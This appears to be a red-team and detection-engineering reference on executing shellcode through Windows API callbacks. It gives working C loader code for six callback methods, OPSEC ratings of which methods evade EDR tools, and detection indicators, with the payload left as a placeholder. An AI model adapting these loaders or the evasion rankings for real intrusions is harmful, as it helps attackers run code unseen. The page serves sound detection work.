# Callback Injection - Educational Analysis

> **MITRE ATT&CK**: T1055.012 - Process Injection: Process Hollowing (variant) / T1106 - Native API
> **Purpose**: Understanding callback-based execution for detection engineering
> **Languages**: C
> **Detection Focus**: VirtualAlloc/VirtualProtect sequences, call stack analysis, callback API abuse

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Windows APIs that accept callback function pointers can be abused to execute arbitrary code,
including shellcode, by passing a pointer to attacker-controlled memory as the callback parameter.
Because the shellcode runs in the context of a legitimate API call rather than via an explicit
`CreateThread` or `CreateRemoteThread`, callback-based execution can bypass security tools that
focus on thread creation as an injection indicator.

### Why This Matters for Red Team Leads
- Callback injection avoids the `CreateThread` call that most EDRs hook and scrutinize
- Dozens of Windows APIs accept callback pointers, creating a broad attack surface
- Understanding which callbacks are monitored informs payload delivery decisions

### Detection Opportunity
Callback injection still requires memory allocation, shellcode copy, and permission changes.
These precursor steps are **detectable** regardless of the callback mechanism used.

## Technical Deep-Dive

### Why Callbacks Evade Detection

```
Traditional Shellcode Execution:
─────────────────────────────────
VirtualAlloc(RW)  →  memcpy(shellcode)  →  VirtualProtect(RX)  →  CreateThread(addr)
                                                                    ▲
                                                           EDR hooks this heavily

Callback-Based Execution:
─────────────────────────────────
VirtualAlloc(RW)  →  memcpy(shellcode)  →  VirtualProtect(RX)  →  EnumWindows(addr, 0)
                                                                    ▲
                                                       Legitimate API, less scrutiny

Both paths share the same precursor chain (VirtualAlloc → memcpy → VirtualProtect).
The difference is only in the final execution trigger. Detection should focus on
the precursor chain, not just the trigger.
```

### Categories of Callback Abuse

```c
/*
 * Educational: Overview of Windows API callback categories.
 *
 * Windows provides many APIs that accept function pointers (callbacks).
 * If shellcode is placed at the address passed as the callback, the
 * API itself will invoke the shellcode on behalf of the caller.
 *
 * Categories:
 * 1. Window enumeration callbacks (EnumWindows, EnumChildWindows)
 * 2. Timer callbacks (CreateTimerQueueTimer, SetTimer)
 * 3. Thread pool callbacks (TpAllocWork, TpPostWork - undocumented)
 * 4. Fiber execution (ConvertThreadToFiber, CreateFiber, SwitchToFiber)
 * 5. Certificate store callbacks (CertEnumSystemStore)
 * 6. Resource enumeration callbacks (EnumResourceTypesW)
 *
 * OPSEC Note:
 * The shared precursor (VirtualAlloc RW → memcpy → VirtualProtect RX)
 * is the strongest detection anchor. The choice of callback only
 * changes the final call, not the setup.
 */
```

### Common Precursor Pattern

```c
/*
 * Educational: Shared allocation pattern used across all callback methods.
 *
 * Every callback injection variant follows this same setup sequence.
 * Detection should focus HERE rather than on individual callback APIs.
 *
 * Detection Points:
 * 1. VirtualAlloc with PAGE_READWRITE for shellcode-sized buffer
 * 2. memcpy (or WriteProcessMemory) of executable content
 * 3. VirtualProtect changing to PAGE_EXECUTE_READ
 * 4. The combination of all three in sequence is HIGH CONFIDENCE
 *
 * OPSEC Notes:
 * - Allocating as RWX (PAGE_EXECUTE_READWRITE) skips VirtualProtect
 *   but is MORE suspicious: RWX allocations are a strong indicator
 * - Allocating as RW then flipping to RX is slightly stealthier
 *   but still creates the VirtualProtect telemetry event
 * - Some operators use NtAllocateVirtualMemory + NtProtectVirtualMemory
 *   (direct syscalls) to avoid the userland hooks on VirtualAlloc/VirtualProtect
 */

#include <windows.h>
#include <stdio.h>

/* Placeholder: in a real scenario this would be actual shellcode bytes */
unsigned char shellcode_placeholder[] = { 0xCC }; /* INT3 - debug break */

/*
 * Allocate, copy, and set permissions for shellcode.
 * Returns pointer to executable shellcode buffer, or NULL on failure.
 *
 * Detection:
 * - VirtualAlloc(PAGE_READWRITE) followed by VirtualProtect(PAGE_EXECUTE_READ)
 * - Memory region with high entropy (encrypted/encoded shellcode)
 * - Region size typical of shellcode payloads (200 bytes to 50 KB)
 */
void* prepare_shellcode(unsigned char *sc, size_t sc_len) {
    /* Step 1: Allocate as RW (not RWX - slightly less suspicious) */
    /* Detection: VirtualAlloc for small, non-image-sized region */
    void *mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return NULL;
    }

    /* Step 2: Copy shellcode into allocated region */
    /* Detection: Writing high-entropy data to newly allocated memory */
    memcpy(mem, sc, sc_len);

    /* Step 3: Change protection to RX (execute + read, no write) */
    /* Detection: VirtualProtect on recently-allocated region to EXECUTE */
    /* This is the strongest single indicator in the chain */
    DWORD oldProtect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return NULL;
    }

    return mem;
}
```

### Category 1: Window Enumeration Callbacks

```c
/*
 * Educational: Window enumeration callbacks for shellcode execution.
 *
 * EnumWindows, EnumChildWindows, and EnumDesktopWindows each accept
 * a callback function that is called for every window found.
 *
 * EnumWindows Prototype:
 * BOOL EnumWindows(
 *     WNDENUMPROC lpEnumFunc,  ← Callback pointer (shellcode target)
 *     LPARAM      lParam       ← Passed to callback
 * );
 *
 * The callback signature is:
 * BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
 *
 * If shellcode is placed at lpEnumFunc, EnumWindows will call it
 * repeatedly (once per top-level window). The shellcode only needs
 * to execute once, so it typically ignores the parameters.
 *
 * OPSEC Rating: LOW stealth
 * - EnumWindows is well-known for callback abuse
 * - Most modern EDRs flag this pattern
 * - The call stack clearly shows EnumWindows invoking non-module code
 *
 * Detection:
 * - EnumWindows callback pointing to non-module (unbacked) memory
 * - Call stack: user32!EnumWindows → <unbacked memory>
 * - ETW: user32 API calls with callback in private memory range
 */
void enum_windows_callback_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    /*
     * EnumWindows will call exec_mem as if it were a WNDENUMPROC.
     * The first call triggers shellcode execution.
     *
     * Detection: Call stack will show:
     *   ntdll!KiUserCallbackDispatcher
     *   user32!EnumWindows
     *   0x<address in VirtualAlloc'd region>  ← SUSPICIOUS
     */
    EnumWindows((WNDENUMPROC)exec_mem, 0);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

/*
 * EnumChildWindows variant: requires a parent window handle.
 * Less commonly abused because it requires a valid HWND.
 *
 * OPSEC: Marginally less monitored than EnumWindows itself.
 *
 * EnumDesktopWindows variant: enumerates windows on a specific desktop.
 * Even less commonly seen in the wild, but same fundamental technique.
 */
void enum_child_windows_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    /* Uses the desktop window as the parent - always valid */
    /* Detection: same as EnumWindows - callback in unbacked memory */
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)exec_mem, 0);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### Category 2: Timer Callbacks

```c
/*
 * Educational: Timer-based callback execution.
 *
 * CreateTimerQueueTimer accepts a callback that fires after a delay.
 * The callback runs on a thread pool thread, not the current thread.
 *
 * BOOL CreateTimerQueueTimer(
 *     PHANDLE             phNewTimer,
 *     HANDLE              TimerQueue,    ← NULL = default queue
 *     WAITORTIMERCALLBACK  Callback,     ← Shellcode pointer
 *     PVOID               Parameter,
 *     DWORD               DueTime,      ← Delay in ms (0 = immediate)
 *     DWORD               Period,       ← 0 = one-shot
 *     ULONG               Flags         ← WT_EXECUTEINTIMERTHREAD
 * );
 *
 * OPSEC Rating: MEDIUM stealth
 * - Timer callbacks are used by legitimate software
 * - The execution occurs on a thread pool thread (different call stack)
 * - However, EDRs increasingly monitor timer queue callbacks
 *
 * Detection:
 * - CreateTimerQueueTimer with callback in private/unbacked memory
 * - Thread pool thread executing from non-module address
 * - Combined with VirtualAlloc+VirtualProtect precursor = high confidence
 */
void timer_callback_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = CreateTimerQueue();

    /*
     * Schedule shellcode execution via timer callback.
     * DueTime=0 means execute immediately.
     * Period=0 means one-shot (do not repeat).
     *
     * Detection: Timer callback pointing to VirtualAlloc'd memory
     * Call stack will show:
     *   ntdll!TppTimerQueueExpiration
     *   ntdll!TppTimerpExecuteCallback
     *   0x<shellcode address>  ← SUSPICIOUS
     */
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
                          (WAITORTIMERCALLBACK)exec_mem,
                          NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);

    /* Wait for timer to fire */
    WaitForSingleObject(GetCurrentThread(), 1000);

    /* Cleanup */
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### Category 3: Thread Pool Callbacks (Undocumented)

```c
/*
 * Educational: Undocumented ntdll thread pool callbacks.
 *
 * The ntdll thread pool API (TpAllocWork, TpPostWork, TpReleaseWork)
 * provides an alternative to the documented CreateThreadpoolWork API.
 * Because these functions are undocumented, they receive LESS monitoring
 * from EDR products compared to documented equivalents.
 *
 * Undocumented API Signatures (reverse-engineered):
 *
 * NTSTATUS TpAllocWork(
 *     PTP_WORK *WorkReturn,       ← Output: work object
 *     PTP_WORK_CALLBACK Callback, ← Function pointer (shellcode)
 *     PVOID Context,              ← Passed to callback
 *     PTP_CALLBACK_ENVIRON Env    ← NULL for default environment
 * );
 *
 * VOID TpPostWork(PTP_WORK Work);         ← Submit work for execution
 * VOID TpReleaseWork(PTP_WORK Work);      ← Release work object
 *
 * OPSEC Rating: HIGH stealth (among callback methods)
 * - Undocumented APIs are less likely to be hooked by EDRs
 * - Thread pool execution looks like normal worker thread activity
 * - Many legitimate applications use thread pools (blends in)
 * - However: resolving undocumented exports via GetProcAddress
 *   is itself a detection indicator
 *
 * Detection:
 * - GetProcAddress resolving "TpAllocWork" from ntdll (unusual)
 * - Thread pool work callback pointing to non-module memory
 * - Undocumented API usage combined with VirtualAlloc precursor
 */

/* Function pointer typedefs for undocumented ntdll APIs */
typedef NTSTATUS (NTAPI *pTpAllocWork)(
    PTP_WORK *WorkReturn,
    PTP_WORK_CALLBACK Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON Env
);
typedef VOID (NTAPI *pTpPostWork)(PTP_WORK Work);
typedef VOID (NTAPI *pTpReleaseWork)(PTP_WORK Work);

void threadpool_callback_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    /*
     * Resolve undocumented thread pool functions.
     *
     * Detection: GetProcAddress for "TpAllocWork" is a strong indicator.
     * Legitimate software uses the documented CreateThreadpoolWork instead.
     * Flag processes resolving undocumented Tp* exports.
     */
    pTpAllocWork _TpAllocWork = (pTpAllocWork)GetProcAddress(ntdll, "TpAllocWork");
    pTpPostWork _TpPostWork = (pTpPostWork)GetProcAddress(ntdll, "TpPostWork");
    pTpReleaseWork _TpReleaseWork = (pTpReleaseWork)GetProcAddress(ntdll, "TpReleaseWork");

    if (!_TpAllocWork || !_TpPostWork || !_TpReleaseWork) {
        printf("Failed to resolve Tp* functions\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    PTP_WORK work = NULL;

    /*
     * Allocate a thread pool work item with shellcode as callback.
     * TpPostWork submits it for execution on a pool thread.
     *
     * Call stack will show:
     *   ntdll!TppWorkpExecuteCallback
     *   ntdll!TppWorkerThread
     *   0x<shellcode address>  ← Only visible if EDR walks full stack
     */
    _TpAllocWork(&work, (PTP_WORK_CALLBACK)exec_mem, NULL, NULL);
    _TpPostWork(work);

    /* Wait for work item to complete */
    WaitForSingleObject(GetCurrentThread(), 1000);

    _TpReleaseWork(work);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### Category 4: Fiber Execution

```c
/*
 * Educational: Fiber-based shellcode execution.
 *
 * Fibers are lightweight execution contexts within a thread (cooperative
 * multitasking). A fiber has its own stack and register state but shares
 * the thread's address space. Fibers do not involve thread creation.
 *
 * Relevant APIs:
 * - ConvertThreadToFiber: Convert current thread to a fiber context
 * - CreateFiber: Create a new fiber with a specified start function
 * - SwitchToFiber: Switch execution to the target fiber
 *
 * Flow:
 * 1. ConvertThreadToFiber(NULL)  → Make current thread fiber-capable
 * 2. CreateFiber(0, shellcode, NULL) → Create fiber pointing to shellcode
 * 3. SwitchToFiber(shellcodeFiber)   → Transfer execution to shellcode
 *
 * OPSEC Rating: MEDIUM stealth
 * - No new thread is created (avoids CreateThread hooks)
 * - Fiber APIs are relatively uncommon, making them stand out
 * - Some EDRs now specifically monitor ConvertThreadToFiber
 *
 * Detection:
 * - ConvertThreadToFiber + CreateFiber + SwitchToFiber sequence
 * - CreateFiber start address pointing to non-module memory
 * - Call stack shows fiber context switch to unbacked memory
 */
void fiber_execution_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    /*
     * Step 1: Convert current thread to fiber.
     * This is required before creating or switching to other fibers.
     *
     * Detection: ConvertThreadToFiber is rarely called by benign software.
     * Most legitimate fiber users are specialized applications (e.g., coroutine
     * libraries). Flag in processes that normally do not use fibers.
     */
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        printf("ConvertThreadToFiber failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /*
     * Step 2: Create a fiber with shellcode as the entry point.
     * Detection: CreateFiber with start address in private memory.
     */
    PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
    if (!shellcodeFiber) {
        printf("CreateFiber failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /*
     * Step 3: Switch to the shellcode fiber.
     * Execution transfers to exec_mem immediately.
     *
     * Detection: After SwitchToFiber, the instruction pointer will be
     * in non-module memory. Thread stack inspection will show execution
     * in unbacked region.
     */
    SwitchToFiber(shellcodeFiber);

    /* If shellcode returns control, we end up here */
    DeleteFiber(shellcodeFiber);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### Category 5: CertEnumSystemStore Callback

```c
/*
 * Educational: Certificate store enumeration callback abuse.
 *
 * CertEnumSystemStore enumerates certificate stores and calls a
 * user-provided callback for each store found.
 *
 * BOOL CertEnumSystemStore(
 *     DWORD  dwFlags,            ← CERT_SYSTEM_STORE_CURRENT_USER
 *     void   *pvSystemStoreLocationPara,
 *     void   *pvArg,             ← Passed to callback
 *     PFN_CERT_ENUM_SYSTEM_STORE pfnEnum ← Callback (shellcode target)
 * );
 *
 * OPSEC Rating: MEDIUM-HIGH stealth
 * - CertEnumSystemStore is not commonly associated with code execution
 * - It is a Crypt32.dll function, less monitored than user32/kernel32 APIs
 * - EDR coverage for this callback is generally poor
 * - However: loading crypt32.dll may itself be noteworthy in some processes
 *
 * Detection:
 * - CertEnumSystemStore callback pointing to non-module memory
 * - Crypt32.dll loaded by processes that do not normally use certificates
 * - Call stack: crypt32!CertEnumSystemStore → <unbacked memory>
 */
void cert_enum_callback_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    /*
     * CertEnumSystemStore will call exec_mem for each certificate store.
     * CERT_SYSTEM_STORE_CURRENT_USER enumerates user-level stores.
     *
     * Detection: Watch for CertEnumSystemStore calls where the callback
     * address falls outside any loaded module's address range.
     */
    CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        NULL,
        NULL,
        (PFN_CERT_ENUM_SYSTEM_STORE)exec_mem
    );

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### Category 6: EnumResourceTypesW Callback

```c
/*
 * Educational: Resource enumeration callback abuse.
 *
 * EnumResourceTypesW enumerates resource types in a module and calls
 * a callback for each type found.
 *
 * BOOL EnumResourceTypesW(
 *     HMODULE hModule,            ← Module to enumerate (NULL = self)
 *     ENUMRESTYPEPROCW lpEnumFunc,← Callback (shellcode target)
 *     LONG_PTR lParam             ← Passed to callback
 * );
 *
 * OPSEC Rating: MEDIUM stealth
 * - Resource enumeration is uncommon but not inherently suspicious
 * - Less monitored than EnumWindows but more visible than CertEnumSystemStore
 * - The callback fires once per resource type (limited number of invocations)
 *
 * Detection:
 * - EnumResourceTypesW callback in non-module memory
 * - Call stack showing kernel32 resource enumeration → unbacked memory
 * - Unusual resource enumeration activity (baseline-dependent)
 */
void enum_resource_types_example(void) {
    void *exec_mem = prepare_shellcode(shellcode_placeholder,
                                        sizeof(shellcode_placeholder));
    if (!exec_mem) return;

    /*
     * Enumerate resource types in the current module.
     * The callback fires for each resource type (RT_ICON, RT_STRING, etc.).
     *
     * Detection: The callback address should resolve to a known module.
     * If it points to VirtualAlloc'd memory, flag as suspicious.
     */
    EnumResourceTypesW(
        GetModuleHandleW(NULL),
        (ENUMRESTYPEPROCW)exec_mem,
        0
    );

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
```

### OPSEC Comparison Table

```
┌──────────────────────────────┬────────┬──────────────────┬───────────────┐
│ Callback Method              │ Stealth│ EDR Coverage     │ Notes         │
├──────────────────────────────┼────────┼──────────────────┼───────────────┤
│ EnumWindows                  │ Low    │ Widely flagged   │ Well-known    │
│ EnumChildWindows             │ Low    │ Widely flagged   │ Same category │
│ EnumDesktopWindows           │ Low    │ Flagged          │ Requires HDESK│
│ CreateTimerQueueTimer        │ Medium │ Increasingly     │ Pool thread   │
│ SetTimer                     │ Medium │ Moderate         │ Needs msg loop│
│ TpAllocWork (undocumented)   │ High   │ Rarely flagged   │ Undocumented  │
│ ConvertThreadToFiber/Create  │ Medium │ Moderate         │ Uncommon API  │
│ CertEnumSystemStore          │ M-High │ Rarely flagged   │ Crypt32.dll   │
│ EnumResourceTypesW           │ Medium │ Moderate         │ Less common   │
└──────────────────────────────┴────────┴──────────────────┴───────────────┘

Key Takeaway:
- TpAllocWork is LEAST monitored because it uses undocumented ntdll APIs
  that many EDRs do not hook or instrument
- EnumWindows is MOST monitored because it was the first widely published
  callback injection method and is included in most EDR rulesets
- ALL methods share the VirtualAlloc → VirtualProtect precursor, which
  is the most reliable detection anchor regardless of callback choice
```

## Detection Indicators

### Primary Detection: Precursor Chain

The strongest detection for callback injection targets the shared setup sequence,
not the individual callback API:

1. **VirtualAlloc** for a small (shellcode-sized) region with PAGE_READWRITE
2. **memcpy/WriteProcessMemory** of high-entropy data into the region
3. **VirtualProtect** changing the region to PAGE_EXECUTE_READ
4. Any API call with a callback pointer inside the recently-allocated region

### Secondary Detection: Call Stack Analysis

When a callback fires, the call stack reveals the execution context:

```
Legitimate callback:
  user32!EnumWindows
  myapp.dll!WindowEnumProc    ← Address inside a loaded, signed module

Malicious callback:
  user32!EnumWindows
  0x000001A2B3C40000          ← Address in private (VirtualAlloc'd) memory
```

Flag any callback invocation where the callback address is in unbacked
(non-module) memory.

### Monitoring Recommendations

| Detection Point | Data Source | Confidence |
|----------------|-------------|------------|
| VirtualAlloc + VirtualProtect(RX) | ETW / API hooks | High |
| Callback address in private memory | Call stack analysis | Very High |
| GetProcAddress for undocumented Tp* | API monitoring | High |
| ConvertThreadToFiber in unexpected process | API monitoring | Medium |
| CertEnumSystemStore callback analysis | API hooks | Medium |
| High-entropy memory + EXECUTE permission | Memory scanning | High |

## Cross-References

- [Sleep Obfuscation](sleep-obfuscation.md) - timer callbacks used in sleep encryption
- [PE Loader](pe-loader.md) - reflective loading also uses callback-like entry point invocation
- [AMSI Patching](amsi-patching.md) - VirtualProtect used for both patching and callback setup
- [ETW Patching](etw-patching.md) - ETW provides telemetry for callback API monitoring
- [AV/EDR Evasion Theory](../../06-defense-evasion/av-edr-evasion.md)
- [Process Injection](../process-injection/README.md)

## References

- MITRE ATT&CK T1055.012, T1106
- Microsoft: Windows API Callback Function Documentation
- ired.team: Shellcode Execution via Callbacks
- Elastic Security: Detecting Callback-Based Shellcode Execution
- MDSec: Alternative Shellcode Execution Methods
